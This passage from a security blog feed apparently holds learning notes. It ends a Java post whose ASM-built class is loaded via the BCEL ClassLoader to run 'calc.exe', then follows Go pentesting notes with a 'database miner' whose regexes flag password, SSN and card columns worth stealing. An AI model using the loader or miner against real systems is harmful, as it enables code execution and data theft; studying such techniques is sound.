label1);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">2</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">4</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitLdcInsn(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitInsn(POP);</span><br><span class="line">        methodVisitor.visitJumpInsn(GOTO, label0);</span><br><span class="line">        methodVisitor.visitLabel(label1);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">0</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">2</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitFieldInsn(PUTFIELD, <span class="string">&quot;com/ByteCodeEvil&quot;</span>, <span class="string">&quot;res&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(RETURN);</span><br><span class="line">        methodVisitor.visitMaxs(<span class="number">6</span>, <span class="number">5</span>);</span><br><span class="line">        methodVisitor.visitEnd();</span><br><span class="line">        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        methodVisitor.visitCode();</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">0</span>);</span><br><span class="line">        methodVisitor.visitFieldInsn(GETFIELD, <span class="string">&quot;com/ByteCodeEvil&quot;</span>, <span class="string">&quot;res&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(ARETURN);</span><br><span class="line">        methodVisitor.visitMaxs(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        methodVisitor.visitEnd();</span><br><span class="line">        classWriter.visitEnd();</span><br><span class="line">        <span class="type">byte</span>[] code = classWriter.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="comment">// 对bytes类型字节码进行BCEL转换</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">byteCode</span> <span class="operator">=</span> com.sun.org.apache.bcel.internal.classfile.Utility.encode(code, <span class="literal">true</span>);</span><br><span class="line">        byteCode = <span class="string">&quot;$$BCEL$$&quot;</span> + byteCode;</span><br><span class="line">        <span class="comment">// 使用BCELClassLoader加载构造的字节码</span></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (ClassLoader) c.newInstance();</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(byteCode);</span><br><span class="line">        java.lang.reflect.Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">        System.out.println(obj.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://blog.csdn.net/it_freshman/article/details/81156106">https://blog.csdn.net/it_freshman/article/details/81156106</a></p><p><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html</a></p><p><a href="https://xz.aliyun.com/t/10535#toc-0">https://xz.aliyun.com/t/10535#toc-0</a></p><p><a href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/#1-java-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/#1-java-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81</a></p>]]></content>
    
    
    <summary type="html">对java加载字节码的一个学习</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(七)</title>
    <link href="https://h0ld1rs.github.io/posts/166.html"/>
    <id>https://h0ld1rs.github.io/posts/166.html</id>
    <published>2022-03-05T12:31:26.000Z</published>
    <updated>2022-03-12T16:19:59.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试学习笔记-七-–滥用数据库和文件系统"><a href="#Go渗透测试学习笔记-七-–滥用数据库和文件系统" class="headerlink" title="Go渗透测试学习笔记(七)–滥用数据库和文件系统"></a>Go渗透测试学习笔记(七)–滥用数据库和文件系统</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在本节，我们学习如何安装和配置各种<code>SQL</code>和<code>NOSQL</code>数据库，并学习如何通过<code>Go</code>来进行交互。</p><h2 id="0x01-与Mongo交互"><a href="#0x01-与Mongo交互" class="headerlink" title="0x01 与Mongo交互"></a>0x01 与Mongo交互</h2><h3 id="1-安装MongoDB数据库然后写入数据"><a href="#1-安装MongoDB数据库然后写入数据" class="headerlink" title="1. 安装MongoDB数据库然后写入数据"></a>1. 安装<code>MongoDB</code>数据库然后写入数据</h3><p>MongoDB是<code>NOSQL</code>数据库，这意味着，他与其他传统数据库不同，他是无架构的。</p><p>使用docker开启了之后，使用<code>store</code>数据库</p><blockquote><p>db.use strore</p></blockquote><p>然后写入数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">db.transactions.insert([</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccnum&quot;</span>: <span class="string">&quot;4444333322221111&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span>: <span class="string">&quot;2019-01-05&quot;</span>,</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: <span class="number">100.12</span>,</span><br><span class="line">    <span class="string">&quot;cvv&quot;</span>: <span class="string">&quot;1234&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;09/2020&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccnum&quot;</span>: <span class="string">&quot;4444123456789012&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span>: <span class="string">&quot;2019-01-07&quot;</span>,</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: <span class="number">2400.18</span>,</span><br><span class="line">    <span class="string">&quot;cvv&quot;</span>: <span class="string">&quot;5544&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;02/2021&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccnum&quot;</span>: <span class="string">&quot;4465122334455667&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span>: <span class="string">&quot;2019-01-29&quot;</span>,</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: <span class="number">1450.87</span>,</span><br><span class="line">    <span class="string">&quot;cvv&quot;</span>: <span class="string">&quot;9876&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;06/2020&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h3 id="2-下载包并写入代码"><a href="#2-下载包并写入代码" class="headerlink" title="2. 下载包并写入代码"></a>2. 下载包并写入代码</h3><p>需要先下载包，因为官方没有与<code>NoSQL</code>直接交互的包，</p><p>所以我们安装如下mongo的驱动：<code>go get gopkg.in/mgo.v2</code></p><p>然后写入以下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"></span><br><span class="line">mgo <span class="string">&quot;gopkg.in/mgo.v2&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">CCNum      <span class="type">string</span>  <span class="string">`bson:&quot;ccnum&quot;`</span></span><br><span class="line">Date       <span class="type">string</span>  <span class="string">`bson:&quot;date&quot;`</span></span><br><span class="line">Amount     <span class="type">float32</span> <span class="string">`bson:&quot;amount&quot;`</span></span><br><span class="line">Cvv        <span class="type">string</span>  <span class="string">`bson:&quot;cvv&quot;`</span></span><br><span class="line">Expiration <span class="type">string</span>  <span class="string">`bson:&quot;exp&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">session, err := mgo.Dial(<span class="string">&quot;192.168.68.137&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"></span><br><span class="line">results := <span class="built_in">make</span>([]Transaction, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> err := session.DB(<span class="string">&quot;store&quot;</span>).C(<span class="string">&quot;transactions&quot;</span>).Find(<span class="literal">nil</span>).All(&amp;results); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, txn := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Println(txn.CCNum, txn.Date, txn.Amount, txn.Cvv, txn.Expiration)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220307112853.png"></p><h2 id="0x02与mysq交互"><a href="#0x02与mysq交互" class="headerlink" title="0x02与mysq交互"></a>0x02与mysq交互</h2><h3 id="1-创建mysql-数据库，并且写入数据"><a href="#1-创建mysql-数据库，并且写入数据" class="headerlink" title="1.创建mysql 数据库，并且写入数据"></a>1.创建mysql 数据库，并且写入数据</h3> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database store;</span><br><span class="line">mysql&gt; create table  transactions(</span><br><span class="line">    -&gt; ccnum varchar(32),</span><br><span class="line">    -&gt; date date,</span><br><span class="line">    -&gt; amount decimal(7,2),</span><br><span class="line">    -&gt; cvv char(4),</span><br><span class="line">    -&gt; exp date);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444333322221111&#x27;</span>, <span class="string">&#x27;2019-01-05&#x27;</span>, <span class="number">100.12</span>, <span class="string">&#x27;1234&#x27;</span>, <span class="string">&#x27;2020-09-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444123456789012&#x27;</span>, <span class="string">&#x27;2019-01-07&#x27;</span>, <span class="number">2400.18</span>, <span class="string">&#x27;5544&#x27;</span>, <span class="string">&#x27;2021-02-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4465122334455667&#x27;</span>, <span class="string">&#x27;2019-01-29&#x27;</span>, <span class="number">1450.87</span>, <span class="string">&#x27;9876&#x27;</span>, <span class="string">&#x27;2020-06-01&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-编写代码"><a href="#2-编写代码" class="headerlink" title="2. 编写代码"></a>2. 编写代码</h3><p><code>Go</code>包包含了一个<code>database/sql</code>的标准包</p><p><code>go get github.com/go-sql-driver/mysql</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;database/sql&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"></span><br><span class="line">_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">db,err := sql.Open(<span class="string">&quot;mysql&quot;</span>,<span class="string">&quot;root:root@tcp(127.0.0.1:3306)/store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ccnum,date,cvv,exp <span class="type">string</span></span><br><span class="line">amount  <span class="type">float32</span></span><br><span class="line">)</span><br><span class="line">rows,err := db.Query(<span class="string">&quot;SELECT ccnum,date,amount,cvv,exp FROM transactions &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">err := rows.Scan(&amp;ccnum,&amp;date,&amp;amount,&amp;cvv,&amp;exp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(ccnum,date,cvv,exp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> rows.Err() != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要引入匿名包，否则加载不了数据库的驱动</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220307155811.png"></p><h2 id="0x03-构建数据库矿工"><a href="#0x03-构建数据库矿工" class="headerlink" title="0x03 构建数据库矿工"></a>0x03 构建数据库矿工</h2><p>在本节中，我们将创建一个工具来检查数据库模式(例如列明)，以确定其中的数据是否值得窃取。</p><h3 id="1-首先实现一个接口"><a href="#1-首先实现一个接口" class="headerlink" title="1. 首先实现一个接口"></a>1. 首先实现一个接口</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DatabaseMiner <span class="keyword">interface</span> &#123;</span><br><span class="line">GetSchema() (*Schema, <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Schema <span class="keyword">struct</span> &#123;</span><br><span class="line">Databases []Database</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Database <span class="keyword">struct</span> &#123;</span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Tables []Table</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Table <span class="keyword">struct</span> &#123;</span><br><span class="line">Name    <span class="type">string</span></span><br><span class="line">Columns []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(m DatabaseMiner)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">s, err := m.GetSchema()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">re := getRegex()</span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;</span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> database.Tables &#123;</span><br><span class="line"><span class="keyword">for</span> _, field := <span class="keyword">range</span> table.Columns &#123;</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> re &#123;</span><br><span class="line"><span class="keyword">if</span> r.MatchString(field) &#123;</span><br><span class="line">fmt.Println(database)</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, field)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getRegex</span><span class="params">()</span></span> []*regexp.Regexp &#123;</span><br><span class="line"><span class="keyword">return</span> []*regexp.Regexp&#123;</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)social`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ssn`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)pass(word)?`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)hash`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ccnum`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)card`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)security`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)key`</span>),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Schema)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> ret <span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;</span><br><span class="line">ret += fmt.Sprint(database.String() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Database)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;[DB] = %+s\n&quot;</span>, d.Name)</span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> d.Tables &#123;</span><br><span class="line">ret += table.String()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t Table)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;    [TABLE] = %+s\n&quot;</span>, t.Name)</span><br><span class="line"><span class="keyword">for</span> _, field := <span class="keyword">range</span> t.Columns &#123;</span><br><span class="line">ret += fmt.Sprintf(<span class="string">&quot;       [COL] = %+s\n&quot;</span>, field)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码首先定义了一个名为<code>DatabaseMiner</code>的接口，实现接口的任何数据类型都需要一个名为<code>GetSchema</code>的方法。每个后端数据库都可能有特定的逻辑来检索数据库模式。</p><p>定义一个<code>Schema</code>类型，该类型由也在此处定义的一些子类组成。我们使用<code>Schema</code>类型在逻辑上表示数据库架构，即数据库，表和列。接口中定义的函数<code>GetSchema()</code>希望返回一个 * Schema(Schema类型的指针)</p><p>现在定义一个名为<code>Search()</code>的函数，函数<code>Search()</code>希望在函数调用期间将<code>DatabaseMiner</code>实例传递给它。它将miner的值储存在一个名为<code>m</code>的变量中，然后使用<code>m.GetSchema()</code>来检索。然后循环遍历整个模式。再根据正则表达式(regex)值列表搜索匹配到的列明。如果能找到，则将数据库模式和匹配字段打印到屏幕上。</p><p>最后，定义一个名为<code>getRegex</code>的函数，此函数使用<code>Go</code>的<code>regex</code>包预编译正则表达式，并返回这些值的一部分。</p><h3 id="2-开始实现"><a href="#2-开始实现" class="headerlink" title="2. 开始实现"></a>2. 开始实现</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;database/sql&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-7/db/dbminer&quot;</span></span><br><span class="line">_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MySQLMiner <span class="keyword">struct</span> &#123;</span><br><span class="line">Host <span class="type">string</span></span><br><span class="line">Db   sql.DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host <span class="type">string</span>)</span></span> (*MySQLMiner, <span class="type">error</span>) &#123;</span><br><span class="line">m := MySQLMiner&#123;Host: host&#125;</span><br><span class="line">err := m.connect()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;m, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> connect() <span class="type">error</span> &#123;</span><br><span class="line"></span><br><span class="line">db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, fmt.Sprintf(<span class="string">&quot;root:root@tcp(%s:3306)/information_schema&quot;</span>, m.Host))</span><br><span class="line"><span class="keyword">if</span> err != <span 